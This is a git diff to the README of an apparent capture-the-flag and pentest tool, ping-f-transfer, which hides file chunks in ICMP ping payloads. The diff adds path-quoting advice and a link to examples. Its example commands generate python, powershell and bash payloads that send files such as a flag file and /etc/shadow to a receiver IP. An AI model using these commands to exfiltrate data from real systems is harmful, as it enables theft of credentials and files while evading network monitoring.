@@ -22,6 +22,7 @@ Each file chunk is embedded in the payload of a standard ping packet — no TCP,
   - [generate-only Flags](#generate-only-flags)
   - [makefile-only Flags](#makefile-only-flags)
 - [Examples](#examples)
+- [Practical Examples](examples/)
 - [Python Standalone Branch](#python-standalone-branch)
 
 ---
@@ -296,7 +297,7 @@ Available for all subcommands (`transfer`, `generate`, `makefile`):
 
 | Flag | Description | Default |
 |---|---|---|
-| `-f, --file FILE` | File to send (**required**) | — |
+| `-f, --file FILE` | File to send (**required**). Use an absolute path for best results (see note below) | — |
 | `-i, --ip IP` | Receiver IP address (**required**) | — |
 | `-p, --period SECS` | Delay between pings | `0` (as fast as possible) |
 | `-r, --random-delay SECS` | Random variation added to `--period` | `0` |
@@ -310,6 +311,18 @@ Available for all subcommands (`transfer`, `generate`, `makefile`):
 | `--capture-packets-filename NAME` | Customize filename in tshark instructions | `capture.hex` |
 | `--decoded-filename NAME` | Customize filename in decode instructions | `output_file` |
 | `--no-banner` | Suppress the ASCII banner | off |
+
+> **Important:** Always use **absolute paths** with `-f` and **quote them** if they contain spaces or backslashes. The file path is embedded into the generated payload, and relative or unquoted paths can break the resulting script.
+>
+> ```bash
+> # Good
+> ping-f-transfer generate -f '/tmp/my file.txt' -i 10.10.14.5 -l python
+> ping-f-transfer generate -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell
+>
+> # Bad — backslashes and spaces may break the payload
+> ping-f-transfer generate -f C:\Users\admin\flag.txt -i 10.10.14.5 -l powershell
+> ping-f-transfer generate -f ../relative/path.txt -i 10.10.14.5 -l python
+> ```
 
 ### `generate`-only Flags
 
@@ -381,6 +394,8 @@ ping-f-transfer generate -f /etc/shadow -i 10.10.14.5 -l bash --split-payload 3
 ```
 
 This outputs numbered chunks you can paste one at a time, followed by the command to execute them.
+
+For comprehensive examples covering **every language** and **every subcommand** with different flag combinations, see the [`examples/`](examples/) directory.
 
 ---
 
